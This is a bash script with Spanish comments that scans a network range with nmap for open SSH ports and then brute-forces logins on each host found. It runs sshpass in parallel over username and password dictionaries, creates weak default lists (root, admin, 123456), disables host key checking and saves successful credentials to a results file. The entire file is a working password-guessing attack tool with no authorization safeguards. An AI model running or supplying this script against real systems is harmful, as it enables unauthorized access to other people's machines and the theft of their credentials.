#!/bin/bash
# Automatización SSH Pro - v1.2
# Mejoras: Carga de diccionarios externos y optimización de hilos.

# Colores
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

# Configuración
THREADS=5
TIMEOUT=5
OUTPUT_DIR="ssh_audit_$(date +%Y%m%d_%H%M%S)"
# Nombres de los archivos de diccionario
USER_FILE="users.txt"
PASS_FILE="passwords.txt"

mkdir -p "$OUTPUT_DIR"
trap "echo -e '${RED}\n[!] Saliendo...${NC}'; exit 1" SIGINT SIGTERM

# Función para verificar o crear diccionarios de ejemplo
check_dictionaries() {
    if [[ ! -f "$USER_FILE" || ! -f "$PASS_FILE" ]]; then
        echo -e "${YELLOW}[!] Archivos de diccionario no encontrados.${NC}"
        echo -e "[*] Creando diccionarios por defecto: $USER_FILE y $PASS_FILE"
        echo -e "root\nadmin\nuser" > "$USER_FILE"
        echo -e "admin\n123456\npassword\nroot" > "$PASS_FILE"
    fi
}

test_credentials() {
    local host=$1 user=$2 pass=$3 port=$4
    
    if timeout $TIMEOUT sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=$TIMEOUT -o BatchMode=yes -o PubkeyAuthentication=no \
        -p "$port" "$user@$host" "id" &>/dev/null; then
        
        echo -e "${GREEN}[+] ¡ÉXITO! $host -> $user:$pass${NC}"
        echo "$host:$port | $user:$pass" >> "$OUTPUT_DIR/valid_credentials.txt"
        return 0
    fi
    return 1
}

brute_force_ssh() {
    local host=$1 port=$2
    local job_count=0

    # Leemos los archivos línea por línea
    while IFS= read -r user; do
        while IFS= read -r pass; do
            
            # Control de hilos (Paralelismo)
            ((job_count++))
            test_credentials "$host" "$user" "$pass" "$port" &
            
            # Si alcanzamos el límite de hilos, esperamos a que terminen
            if (( job_count % THREADS == 0 )); then
                wait
            fi

        done < "$PASS_FILE"
    done < "$USER_FILE"
    wait # Esperar los últimos procesos
}

scan_ssh_services() {
    local network=$1
    echo -e "[*] Escaneando red: $network..."
    nmap -p 22 --open -Pn "$network" -oG "$OUTPUT_DIR/scan.gnmap" > /dev/null
    grep "Host:" "$OUTPUT_DIR/scan.gnmap" | awk '{print $2}' > "$OUTPUT_DIR/ssh_hosts.txt"
    
    local count=$(wc -l < "$OUTPUT_DIR/ssh_hosts.txt")
    echo -e "[*] Se encontraron ${YELLOW}$count${NC} hosts con SSH abierto."
}

main() {
    # Validar dependencias
    for cmd in nmap sshpass; do
        command -v $cmd &>/dev/null || { echo -e "${RED}[-] Falta $cmd${NC}"; exit 1; }
    done

    check_dictionaries

    # Definir red (puedes pasarla como argumento: ./script.sh 10.0.0.0/24)
    local target_net=${1:-"192.168.1.0/24"}
    
    scan_ssh_services "$target_net"

    if [[ -s "$OUTPUT_DIR/ssh_hosts.txt" ]]; then
        while read -r host; do
            echo -e "\n[*] Atacando: ${YELLOW}$host${NC}"
            brute_force_ssh "$host" 22
        done < "$OUTPUT_DIR/ssh_hosts.txt"
    else
        echo -e "${RED}[-] No hay hosts para procesar.${NC}"
    fi

    echo -e "\n${GREEN}--- Proceso completado. Resultados en $OUTPUT_DIR ---${NC}"
}

main "$@"